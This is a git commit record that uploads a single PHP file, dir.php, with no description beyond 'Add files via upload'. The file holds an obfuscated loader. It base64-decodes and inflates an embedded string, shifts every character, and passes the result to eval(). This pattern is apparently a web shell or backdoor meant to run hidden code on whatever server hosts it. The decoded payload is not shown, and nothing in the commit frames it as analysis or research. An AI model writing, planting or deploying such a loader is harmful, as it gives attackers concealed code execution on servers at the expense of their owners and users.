15280afeca0e77b0541fdd15a2db6eaa36e2b4f3
Null <93053007+Cnull00@users.noreply.github.com>
2025-12-06 12:47:12 +0700

    Add files via upload

---
+++ dir.php
@@ -0,0 +1,9 @@
+<?php function sGxJaz($SivvWo)
+{ 
+$SivvWo=gzinflate(base64_decode($SivvWo));
+ for($i=0;$i<strlen($SivvWo);$i++)
+ {
+$SivvWo[$i] = chr(ord($SivvWo[$i])-1);
+ }
+ return $SivvWo;
+ }eval(sGxJaz("RY/BCsIwDIYfoE8RSg8Kc/PixaHgQTx505PKKFu2Clk72gzUl7fWibnlz//lT9ToCTYgDfOwLgrrQqA8YNfqkTi3yEWDA7nnQlPUjSyFUG7gEJmLgFiJlLDZTn3SemTjGgkfWR72J5n9ZwZ1g36anQP6xa5Dy2s4utedSBerfHn1VysTchO3T2TtLOODY2pgj7qvJqGqY8c4SzfNS6EazTq62jth1SF/fZbDTMVHM2g1Bczgty8SAmvjIHHlGw=="));?>
